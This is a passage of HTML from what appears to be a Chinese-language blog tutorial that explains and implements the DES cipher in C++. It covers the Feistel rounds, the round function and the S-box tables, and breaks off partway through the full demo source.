class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;第&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot;轮&quot;</span>&lt;&lt;endl;</span><br><span class="line">        newLeft=rightBits;<span class="comment">//保存右序列的值 后续赋给左序列</span></span><br><span class="line">        rightBits=leftBits^<span class="built_in">f</span>(rightBits,subKey[i]);</span><br><span class="line">        leftBits=newLeft;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;L&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;leftBits&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;R&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;rightBits&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>左右交换合并左右序列，再进行逆初始置换：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最后合并密文 左右互换</span></span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;<span class="number">32</span>)&#123;</span><br><span class="line">            cipher[i]=leftBits[i];</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cipher[i]=rightBits[i<span class="number">-32</span>];</span><br><span class="line">        &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">//最后逆初始置换</span></span><br><span class="line"> currentBits=cipher;</span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">        cipher[<span class="number">63</span>-i]=currentBits[<span class="number">64</span>-IP_1[i]];</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>其中比较重要的是<strong>轮函数</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//轮函数</span></span><br><span class="line"><span class="function">bitset&lt;32&gt; <span class="title">f</span><span class="params">(bitset&lt;<span class="number">32</span>&gt; R, bitset&lt;<span class="number">48</span>&gt;key)</span></span>&#123;</span><br><span class="line">    <span class="comment">//轮函数里的算法核心是 先将R扩展到48 然后与key进行异或，再进入S盒48代换选择为32bit 最后32进行置换</span></span><br><span class="line">    <span class="comment">//扩展置换——异或——代换选择——置换</span></span><br><span class="line">    bitset&lt;48&gt; expend;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">47</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">        expend[i]=R[<span class="number">32</span>-E[<span class="number">47</span>-i]];</span><br><span class="line">    expend=expend^key;</span><br><span class="line">    bitset&lt;32&gt; output;</span><br><span class="line">    <span class="comment">//48/6=8 一共8个S盒进行代换选择 顺序应该是从左往右0-5 5-11 11-17 ····</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> flag=(i+<span class="number">1</span>)*<span class="number">6</span><span class="number">-1</span>;<span class="comment">//47-flag 就等于每次遍历的后界 假设i=1 flag=5 47-5=42  l：42+5=47 r：42</span></span><br><span class="line">        <span class="keyword">int</span> row=<span class="number">2</span>*expend[<span class="number">47</span>-flag+<span class="number">5</span>]+expend[<span class="number">47</span>-flag]; </span><br><span class="line">        <span class="keyword">int</span> col=<span class="number">8</span>*expend[<span class="number">47</span>-flag+<span class="number">4</span>]+<span class="number">4</span>*expend[<span class="number">47</span>-flag+<span class="number">3</span>]+<span class="number">2</span>*expend[<span class="number">47</span>-flag+<span class="number">2</span>]+expend[<span class="number">47</span>-flag+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> outnum=S_BOX[i][row][col];</span><br><span class="line">        <span class="function">bitset&lt;4&gt; <span class="title">binary</span><span class="params">(outnum)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">4</span>;j++)<span class="comment">//必须从1开始</span></span><br><span class="line">        &#123;</span><br><span class="line">            output[(<span class="number">8</span>-i)*<span class="number">4</span>-j]=binary[<span class="number">4</span>-j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    bitset&lt;32&gt; temp=output;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">        output[<span class="number">31</span>-i]=temp[<span class="number">32</span>-P[i]];</span><br><span class="line">    <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>轮函数输入的是右序列(32)和密钥(48)，首先需要将右序列扩展成48位，同样根据置换表就可以达到效果。</p><p>扩展序列<code>expend</code>再与密钥进行一次异或，异或的结果为48位，但最后要输出的序列为32位，所以需要有一个可逆映射，48位通过8个S盒，每6位压缩成4位。</p><p><img src="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/image-20201206220359760.png" class="lazyload" data-srcset="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/image-20201206220359760.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201206220359760"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">                             S1</span><br><span class="line"><span class="number">14</span>  <span class="number">4</span>  <span class="number">13</span>  <span class="number">1</span>   <span class="number">2</span> <span class="number">15</span>  <span class="number">11</span>  <span class="number">8</span>   <span class="number">3</span> <span class="number">10</span>   <span class="number">6</span> <span class="number">12</span>   <span class="number">5</span>  <span class="number">9</span>   <span class="number">0</span>  <span class="number">7</span></span><br><span class="line"> <span class="number">0</span> <span class="number">15</span>   <span class="number">7</span>  <span class="number">4</span>  <span class="number">14</span>  <span class="number">2</span>  <span class="number">13</span>  <span class="number">1</span>  <span class="number">10</span>  <span class="number">6</span>  <span class="number">12</span> <span class="number">11</span>   <span class="number">9</span>  <span class="number">5</span>   <span class="number">3</span>  <span class="number">8</span></span><br><span class="line"> <span class="number">4</span>  <span class="number">1</span>  <span class="number">14</span>  <span class="number">8</span>  <span class="number">13</span>  <span class="number">6</span>   <span class="number">2</span> <span class="number">11</span>  <span class="number">15</span> <span class="number">12</span>   <span class="number">9</span>  <span class="number">7</span>   <span class="number">3</span> <span class="number">10</span>   <span class="number">5</span>  <span class="number">0</span></span><br><span class="line"><span class="number">15</span> <span class="number">12</span>   <span class="number">8</span>  <span class="number">2</span>   <span class="number">4</span>  <span class="number">9</span>   <span class="number">1</span>  <span class="number">7</span>   <span class="number">5</span> <span class="number">11</span>   <span class="number">3</span> <span class="number">14</span>  <span class="number">10</span>  <span class="number">0</span>   <span class="number">6</span> <span class="number">13</span></span><br><span class="line">                                 </span><br><span class="line">                             S2</span><br><span class="line"><span class="number">15</span>  <span class="number">1</span>   <span class="number">8</span> <span class="number">14</span>   <span class="number">6</span> <span class="number">11</span>   <span class="number">3</span>  <span class="number">4</span>   <span class="number">9</span>  <span class="number">7</span>   <span class="number">2</span> <span class="number">13</span>  <span class="number">12</span>  <span class="number">0</span>   <span class="number">5</span> <span class="number">10</span></span><br><span class="line"> <span class="number">3</span> <span class="number">13</span>   <span class="number">4</span>  <span class="number">7</span>  <span class="number">15</span>  <span class="number">2</span>   <span class="number">8</span> <span class="number">14</span>  <span class="number">12</span>  <span class="number">0</span>   <span class="number">1</span> <span class="number">10</span>   <span class="number">6</span>  <span class="number">9</span>  <span class="number">11</span>  <span class="number">5</span></span><br><span class="line"> <span class="number">0</span> <span class="number">14</span>   <span class="number">7</span> <span class="number">11</span>  <span class="number">10</span>  <span class="number">4</span>  <span class="number">13</span>  <span class="number">1</span>   <span class="number">5</span>  <span class="number">8</span>  <span class="number">12</span>  <span class="number">6</span>   <span class="number">9</span>  <span class="number">3</span>   <span class="number">2</span> <span class="number">15</span></span><br><span class="line"><span class="number">13</span>  <span class="number">8</span>  <span class="number">10</span>  <span class="number">1</span>   <span class="number">3</span> <span class="number">15</span>   <span class="number">4</span>  <span class="number">2</span>  <span class="number">11</span>  <span class="number">6</span>   <span class="number">7</span> <span class="number">12</span>   <span class="number">0</span>  <span class="number">5</span>  <span class="number">14</span>  <span class="number">9</span></span><br><span class="line">                             S3</span><br><span class="line"> </span><br><span class="line"><span class="number">10</span>  <span class="number">0</span>   <span class="number">9</span> <span class="number">14</span>   <span class="number">6</span>  <span class="number">3</span>  <span class="number">15</span>  <span class="number">5</span>   <span class="number">1</span> <span class="number">13</span>  <span class="number">12</span>  <span class="number">7</span>  <span class="number">11</span>  <span class="number">4</span>   <span class="number">2</span>  <span class="number">8</span></span><br><span class="line"><span class="number">13</span>  <span class="number">7</span>   <span class="number">0</span>  <span class="number">9</span>   <span class="number">3</span>  <span class="number">4</span>   <span class="number">6</span> <span class="number">10</span>   <span class="number">2</span>  <span class="number">8</span>   <span class="number">5</span> <span class="number">14</span>  <span class="number">12</span> <span class="number">11</span>  <span class="number">15</span>  <span class="number">1</span></span><br><span class="line"><span class="number">13</span>  <span class="number">6</span>   <span class="number">4</span>  <span class="number">9</span>   <span class="number">8</span> <span class="number">15</span>   <span class="number">3</span>  <span class="number">0</span>  <span class="number">11</span>  <span class="number">1</span>   <span class="number">2</span> <span class="number">12</span>   <span class="number">5</span> <span class="number">10</span>  <span class="number">14</span>  <span class="number">7</span></span><br><span class="line"> <span class="number">1</span> <span class="number">10</span>  <span class="number">13</span>  <span class="number">0</span>   <span class="number">6</span>  <span class="number">9</span>   <span class="number">8</span>  <span class="number">7</span>   <span class="number">4</span> <span class="number">15</span>  <span class="number">14</span>  <span class="number">3</span>  <span class="number">11</span>  <span class="number">5</span>   <span class="number">2</span> <span class="number">12</span></span><br><span class="line">                                 </span><br><span class="line">                             S4 </span><br><span class="line"> <span class="number">7</span> <span class="number">13</span>  <span class="number">14</span>  <span class="number">3</span>   <span class="number">0</span>  <span class="number">6</span>   <span class="number">9</span> <span class="number">10</span>   <span class="number">1</span>  <span class="number">2</span>   <span class="number">8</span>  <span class="number">5</span>  <span class="number">11</span> <span class="number">12</span>   <span class="number">4</span> <span class="number">15</span></span><br><span class="line"><span class="number">13</span>  <span class="number">8</span>  <span class="number">11</span>  <span class="number">5</span>   <span class="number">6</span> <span class="number">15</span>   <span class="number">0</span>  <span class="number">3</span>   <span class="number">4</span>  <span class="number">7</span>   <span class="number">2</span> <span class="number">12</span>   <span class="number">1</span> <span class="number">10</span>  <span class="number">14</span>  <span class="number">9</span></span><br><span class="line"><span class="number">10</span>  <span class="number">6</span>   <span class="number">9</span>  <span class="number">0</span>  <span class="number">12</span> <span class="number">11</span>   <span class="number">7</span> <span class="number">13</span>  <span class="number">15</span>  <span class="number">1</span>   <span class="number">3</span> <span class="number">14</span>   <span class="number">5</span>  <span class="number">2</span>   <span class="number">8</span>  <span class="number">4</span></span><br><span class="line"> <span class="number">3</span> <span class="number">15</span>   <span class="number">0</span>  <span class="number">6</span>  <span class="number">10</span>  <span class="number">1</span>  <span class="number">13</span>  <span class="number">8</span>   <span class="number">9</span>  <span class="number">4</span>   <span class="number">5</span> <span class="number">11</span>  <span class="number">12</span>  <span class="number">7</span>   <span class="number">2</span> <span class="number">14</span></span><br><span class="line">                                 </span><br><span class="line">                             S5</span><br><span class="line"> <span class="number">2</span> <span class="number">12</span>   <span class="number">4</span>  <span class="number">1</span>   <span class="number">7</span> <span class="number">10</span>  <span class="number">11</span>  <span class="number">6</span>   <span class="number">8</span>  <span class="number">5</span>   <span class="number">3</span> <span class="number">15</span>  <span class="number">13</span>  <span class="number">0</span>  <span class="number">14</span>  <span class="number">9</span></span><br><span class="line"><span class="number">14</span> <span class="number">11</span>   <span class="number">2</span> <span class="number">12</span>   <span class="number">4</span>  <span class="number">7</span>  <span class="number">13</span>  <span class="number">1</span>   <span class="number">5</span>  <span class="number">0</span>  <span class="number">15</span> <span class="number">10</span>   <span class="number">3</span>  <span class="number">9</span>   <span class="number">8</span>  <span class="number">6</span></span><br><span class="line"> <span class="number">4</span>  <span class="number">2</span>   <span class="number">1</span> <span class="number">11</span>  <span class="number">10</span> <span class="number">13</span>   <span class="number">7</span>  <span class="number">8</span>  <span class="number">15</span>  <span class="number">9</span>  <span class="number">12</span>  <span class="number">5</span>   <span class="number">6</span>  <span class="number">3</span>   <span class="number">0</span> <span class="number">14</span></span><br><span class="line"><span class="number">11</span>  <span class="number">8</span>  <span class="number">12</span>  <span class="number">7</span>   <span class="number">1</span> <span class="number">14</span>   <span class="number">2</span> <span class="number">13</span>   <span class="number">6</span> <span class="number">15</span>   <span class="number">0</span>  <span class="number">9</span>  <span class="number">10</span>  <span class="number">4</span>   <span class="number">5</span>  <span class="number">3</span>                                      </span><br><span class="line">                            S6</span><br><span class="line"><span class="number">12</span>  <span class="number">1</span>  <span class="number">10</span> <span class="number">15</span>   <span class="number">9</span>  <span class="number">2</span>   <span class="number">6</span>  <span class="number">8</span>   <span class="number">0</span> <span class="number">13</span>   <span class="number">3</span>  <span class="number">4</span>  <span class="number">14</span>  <span class="number">7</span>   <span class="number">5</span> <span class="number">11</span></span><br><span class="line"><span class="number">10</span> <span class="number">15</span>   <span class="number">4</span>  <span class="number">2</span>   <span class="number">7</span> <span class="number">12</span>   <span class="number">9</span>  <span class="number">5</span>   <span class="number">6</span>  <span class="number">1</span>  <span class="number">13</span> <span class="number">14</span>   <span class="number">0</span> <span class="number">11</span>   <span class="number">3</span>  <span class="number">8</span></span><br><span class="line"> <span class="number">9</span> <span class="number">14</span>  <span class="number">15</span>  <span class="number">5</span>   <span class="number">2</span>  <span class="number">8</span>  <span class="number">12</span>  <span class="number">3</span>   <span class="number">7</span>  <span class="number">0</span>   <span class="number">4</span> <span class="number">10</span>   <span class="number">1</span> <span class="number">13</span>  <span class="number">11</span>  <span class="number">6</span></span><br><span class="line"> <span class="number">4</span>  <span class="number">3</span>   <span class="number">2</span> <span class="number">12</span>   <span class="number">9</span>  <span class="number">5</span>  <span class="number">15</span> <span class="number">10</span>  <span class="number">11</span> <span class="number">14</span>   <span class="number">1</span>  <span class="number">7</span>   <span class="number">6</span>  <span class="number">0</span>   <span class="number">8</span> <span class="number">13</span></span><br><span class="line">                                 </span><br><span class="line">                            S7</span><br><span class="line"> <span class="number">4</span> <span class="number">11</span>   <span class="number">2</span> <span class="number">14</span>  <span class="number">15</span>  <span class="number">0</span>   <span class="number">8</span> <span class="number">13</span>   <span class="number">3</span> <span class="number">12</span>   <span class="number">9</span>  <span class="number">7</span>   <span class="number">5</span> <span class="number">10</span>   <span class="number">6</span>  <span class="number">1</span></span><br><span class="line"><span class="number">13</span>  <span class="number">0</span>  <span class="number">11</span>  <span class="number">7</span>   <span class="number">4</span>  <span class="number">9</span>   <span class="number">1</span> <span class="number">10</span>  <span class="number">14</span>  <span class="number">3</span>   <span class="number">5</span> <span class="number">12</span>   <span class="number">2</span> <span class="number">15</span>   <span class="number">8</span>  <span class="number">6</span></span><br><span class="line"> <span class="number">1</span>  <span class="number">4</span>  <span class="number">11</span> <span class="number">13</span>  <span class="number">12</span>  <span class="number">3</span>   <span class="number">7</span> <span class="number">14</span>  <span class="number">10</span> <span class="number">15</span>   <span class="number">6</span>  <span class="number">8</span>   <span class="number">0</span>  <span class="number">5</span>   <span class="number">9</span>  <span class="number">2</span></span><br><span class="line"> <span class="number">6</span> <span class="number">11</span>  <span class="number">13</span>  <span class="number">8</span>   <span class="number">1</span>  <span class="number">4</span>  <span class="number">10</span>  <span class="number">7</span>   <span class="number">9</span>  <span class="number">5</span>   <span class="number">0</span> <span class="number">15</span>  <span class="number">14</span>  <span class="number">2</span>   <span class="number">3</span> <span class="number">12</span></span><br><span class="line">                                 </span><br><span class="line">                            S8</span><br><span class="line"><span class="number">13</span>  <span class="number">2</span>   <span class="number">8</span>  <span class="number">4</span>   <span class="number">6</span> <span class="number">15</span>  <span class="number">11</span>  <span class="number">1</span>  <span class="number">10</span>  <span class="number">9</span>   <span class="number">3</span> <span class="number">14</span>   <span class="number">5</span>  <span class="number">0</span>  <span class="number">12</span>  <span class="number">7</span></span><br><span class="line"> <span class="number">1</span> <span class="number">15</span>  <span class="number">13</span>  <span class="number">8</span>  <span class="number">10</span>  <span class="number">3</span>   <span class="number">7</span>  <span class="number">4</span>  <span class="number">12</span>  <span class="number">5</span>   <span class="number">6</span> <span class="number">11</span>   <span class="number">0</span> <span class="number">14</span>   <span class="number">9</span>  <span class="number">2</span></span><br><span class="line"> <span class="number">7</span> <span class="number">11</span>   <span class="number">4</span>  <span class="number">1</span>   <span class="number">9</span> <span class="number">12</span>  <span class="number">14</span>  <span class="number">2</span>   <span class="number">0</span>  <span class="number">6</span>  <span class="number">10</span> <span class="number">13</span>  <span class="number">15</span>  <span class="number">3</span>   <span class="number">5</span>  <span class="number">8</span></span><br><span class="line"> <span class="number">2</span>  <span class="number">1</span>  <span class="number">14</span>  <span class="number">7</span>   <span class="number">4</span> <span class="number">10</span>   <span class="number">8</span> <span class="number">13</span>  <span class="number">15</span> <span class="number">12</span>   <span class="number">9</span>  <span class="number">0</span>   <span class="number">3</span>  <span class="number">5</span>   <span class="number">6</span> <span class="number">11</span></span><br></pre></td></tr></table></figure><p>假设序列为<code>011000 010001 011110 111010 100001 100110 010100 100111</code>经过8个S盒</p><p><code>0101 1100 1000 0010 1011 0101 1001 0111</code>举第一个例子，<code>011000</code>，从左往右依次使用1-8S盒子，其中的行由首位和最后一位<code>00</code>看出为第0行，而列由中间四位<code>1100</code>看出为第12列，所以第S1的0行12列为5，刚好对应下面的<code>0101</code>，以上完成第一次代换，通过8次相同的操作即可得到32位。</p><p>接下来的32位经过置换即为轮函数的输出</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bitset&lt;32&gt; temp=output;</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">       output[<span class="number">31</span>-i]=temp[<span class="number">32</span>-P[i]];</span><br></pre></td></tr></table></figure><p>最后轮函数的输出与左序列进行最后的异或即可得到下一轮的右序列。</p><h2 id="源代码："><a href="#源代码：" class="headerlink" title="源代码："></a>源代码：</h2><p><code>DESdemo.cpp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bitset&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;temp.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">bitset&lt;48&gt; subKey[<span class="number">16</span>];         <span class="comment">// 存放16轮子密钥</span></span><br><span class="line"><span class="comment">//左移函数</span></span><br><span class="line"><span class="function">bitset&lt;28&gt; <span class="title">leftshifts</span><span class="params">(bitset&lt;<span class="number">28</span>&gt; key, <span class="keyword">int</span> position)</span></span>&#123;</span><br><span class="line">    bitset&lt;28&gt; temp_key=key;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">27</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i-position&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            key[i]=temp_key[i-position];<span class="comment">//假设偏移是1 27就要26</span></span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* 此时的码应该从前面取 循环偏移*/</span></span><br><span class="line">            key[i]=temp_key[i-position+<span class="number">28</span>];<span class="comment">//假设偏移是1 -1的位置+28就是最头的位置</span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//轮函数</span></span><br><span class="line"><span class="function">bitset&lt;32&gt; <span class="title">f</span><span class="params">(bitset&lt;<span class="number">32</span>&gt; R, bitset&lt;<span class="number">48</span>&gt;key)</span></span>&#123;</span><br><span class="line">    <span class="comment">//轮函数里的算法核心是 先将R扩展到48 然后与key进行异或，再进入S盒48代换选择为32bit 最后32进行置换</span></span><br><span class="line">    <span class="comment">//扩展置换——异或——代换选择——置换</span></span><br><span class="line">    bitset&lt;48&gt; expend;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">47</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">        expend[i]=R[<span class="number">32</span>-E[<span class="number">47</span>-i]];</span><br><span class="line">    expend=expend^key;</span><br><span class="line">    bitset&lt;32&gt; output;</span><br><span class="line">    <span class="comment">//48/6=8 一共8个S盒进行代换选择 顺序应该是从左往右0-5 5-11 11-17 ····</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> flag=(i+<span class="number">1</span>)*<span class="number">6</span><span class="number">-1</span>;<span class="comment">//47-flag 就等于每次遍历的后界 假设i=1 flag=5 47-5=42  l：42+5=47 r：42</span></span><br><span class="line">        <span class="keyword">int</span> row=<span class="number">2</span>*expend[<span class="number">47</span>-flag+<span class="number">5</span>]+expend[<span class="number">47</span>-flag];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> col=<span class="number">8</span>*expend[<span class="number">47</span>-flag+<span class="number">4</span>]+<span class="number">4</span>*expend[<span class="number">47</span>-flag+<span class="number">3</span>]+<span class="number">2</span>*expend[<span class="number">47</span>-flag+<span class="number">2</span>]+expend[<span class="number">47</span>-flag+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> outnum=S_BOX[i][row][col];</span><br><span class="line">        <span class="function">bitset&lt;4&gt; <span class="title">binary</span><span class="params">(outnum)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">4</span>;j++)<span class="comment">//必须从1开始</span></span><br><span class="line">        &#123;</span><br><span class="line">            output[(<span class="number">8</span>-i)*<span class="number">4</span>-j]=binary[<span class="number">4</span>-j];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bitset&lt;32&gt; temp=output;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">        output[<span class="number">31</span>-i]=temp[<span class="number">32</span>-P[i]];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//-------------密钥处理 输入的64位密钥转存在16轮子密钥中-----------------------</span></span><br><span class="line">    string keys=<span class="string">&quot;0001001100110100010101110111100110011011101111001101111111110001&quot;</span>;</span><br><span class="line">    